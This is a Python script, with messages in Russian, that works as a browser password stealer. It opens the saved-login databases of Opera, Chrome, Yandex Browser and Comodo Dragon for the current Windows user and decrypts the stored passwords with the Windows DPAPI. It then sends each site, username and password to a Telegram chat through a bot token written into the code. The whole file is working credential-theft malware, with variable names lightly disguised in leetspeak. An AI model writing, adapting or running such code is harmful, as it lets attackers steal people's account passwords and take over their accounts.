from os import getlogin
import sqlite3
import win32crypt
import telebot
###################################################################################################
t0ken = "1802803265:AAE7dqyi-UGGAxilse9NW207WBB2Y6ANDoE"
b0t = telebot.TeleBot(t0ken)
i=0
name_0f_user = getlogin()
###################################################################################################
op3ra = "C:\\Users\\" + name_0f_user + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\" + "Login data"
g00gle = "C:\\Users\\" + name_0f_user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\" + "Login Data"
yand3x = "C:\\Users\\" + name_0f_user + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\" + "Login Data"
c0m0d0drag0n = "C:\\Users\\" + name_0f_user + "\\AppData\\Local\\Comodo\\Dragon\\User Data\\Default\\" + "Login Data"
lsdir=[op3ra,g00gle,yand3x,c0m0d0drag0n]
lsbr0wser=["Opera","Google Chrome","Yandex Browser","Comodo Dragon"]
###################################################################################################
b0t.send_message(-1001416127866, "Stealer: " + name_0f_user)
for i in range(len(lsdir)):
    try:
        br0wser=lsdir[i]
        connecti0n = sqlite3.connect(br0wser)
        curs0r = connecti0n.cursor()
        curs0r.execute('SELECT origin_url, username_value, password_value FROM logins')
        for ii in curs0r.fetchall():
            d3cryptpass = win32crypt.CryptUnprotectData(ii[2])
            b0t.send_message(-1001416127866, lsbr0wser[i])
            b0t.send_message(-1001416127866, "----------------------------")
            b0t.send_message(-1001416127866, "Сайт: " + ii[0])
            b0t.send_message(-1001416127866, "----------------------------")
            b0t.send_message(-1001416127866, "Логин: " + ii[1])
            b0t.send_message(-1001416127866, "----------------------------")
            d3cryptpass=str(d3cryptpass)
            b0t.send_message(-1001416127866, "Пароль: " + d3cryptpass)
            b0t.send_message(-1001416127866, "----------------------------")
    except:
        b0t.send_message(id_вашего_чата, "Браузер " + lsbr0wser[i] + " был запущен, или не установлен")